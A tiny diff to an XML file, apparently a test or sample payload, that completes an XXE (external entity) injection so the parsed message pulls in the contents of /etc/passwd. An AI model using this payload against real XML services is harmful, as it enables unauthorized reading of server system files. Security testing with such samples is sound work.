@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE msg [
-   <!ENTITY xxe SYSTEM "file:///etc/" >]>
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <msg>&xxe;</msg>
